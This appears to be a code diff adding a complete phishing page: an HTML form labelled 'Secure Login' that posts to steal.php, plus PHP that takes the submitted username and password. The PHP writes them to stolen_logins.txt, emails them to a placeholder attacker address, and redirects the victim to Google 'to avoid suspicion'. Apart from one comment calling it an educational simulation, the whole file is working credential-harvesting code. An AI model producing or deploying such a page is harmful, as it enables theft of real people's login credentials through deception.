@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login</title>
+</head>
+<body>
+    <h2>Secure Login</h2>
+    <form action="steal.php" method="POST">
+        <label>Email:</label>
+        <input type="text" name="username" required><br><br>
+        <label>Password:</label>
+        <input type="password" name="password" required><br><br>
+        <input type="submit" value="Log In">
+    </form>
+</body>
+</html>
+
+<?php
+// Get the credentials from the form
+$username = $_POST['username'];
+$password = $_POST['password'];
+
+// Save to a text file (on the server)
+$logData = "Username: $username | Password: $password\n";
+$file = fopen("stolen_logins.txt", "a");
+fwrite($file, $logData);
+fclose($file);
+
+// Send an email to the attacker (educational simulation)
+$to = "scammer@example.com";  // Replace with a placeholder
+$subject = "Phished Login Captured";
+$message = "Username: $username\nPassword: $password";
+$headers = "From: phishing@example.com";
+
+// Send the email (works if the server supports mail())
+mail($to, $subject, $message, $headers);
+
+// Redirect to a real website (optional)
+header("Location: https://www.google.com");  // To avoid suspicion
+exit();
+?>
